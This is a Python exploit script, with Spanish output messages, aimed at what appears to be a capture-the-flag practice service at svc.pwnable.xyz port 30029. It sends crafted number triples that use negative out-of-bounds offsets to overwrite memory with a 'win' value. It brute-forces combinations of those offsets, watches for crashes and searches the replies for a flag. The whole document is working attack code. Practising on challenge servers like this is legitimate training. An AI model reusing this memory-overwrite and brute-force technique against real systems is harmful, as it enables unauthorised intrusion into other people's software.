#!/usr/bin/env python3
import socket
import time
import sys

def test_combination(offsets):
    print(f"\n{'='*60}")
    print(f"Probando offsets: {offsets}")
    print('='*60)
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(20)
        s.connect(("svc.pwnable.xyz", 30029))
        
        banner = s.recv(1024)
        print("Conectado")
        
        win = 0xa21
        
        for offset in offsets:
            b = abs(offset) * 0x5555
            a = win ^ b
            print(f"  Sobrescribiendo offset {offset}...")
            
            try:
                s.sendall(f"{a} {b} {offset}\n".encode())
                time.sleep(0.3)
                
                try:
                    resp = s.recv(2048, socket.MSG_DONTWAIT)
                    if b"Result:" in resp:
                        print(f"    OK")
                except:
                    pass
            except BrokenPipeError:
                print(f"    CRASH en offset {offset}!")
                return "CRASH"
        
        # Si llegamos aquí, no crasheó
        print("  No crasheó. Intentando input adicional...")
        try:
            s.sendall(b"1 2 3\n")
            time.sleep(1)
            data = s.recv(4096)
            if data:
                decoded = data.decode()
                print(f"  Respuesta: {decoded[:100]}")
                if "flag" in decoded.lower():
                    print("\n¡FLAG ENCONTRADA!")
                    print(decoded)
                    return "FLAG"
        except Exception as e:
            print(f"  Error en input adicional: {e}")
        
        s.close()
        return "OK"
        
    except Exception as e:
        print(f"Error: {e}")
        return "ERROR"
    
    finally:
        time.sleep(2)

# Probar diferentes combinaciones
combinations = [
    [-9, -6],
    [-8, -6],
    [-7, -6],
    [-9, -8],
    [-9, -7],
    [-8, -7],
    [-9, -8, -6],
    [-9, -7, -6],
    [-8, -7, -6],
]

for combo in combinations:
    result = test_combination(combo)
    if result == "FLAG":
        sys.exit(0)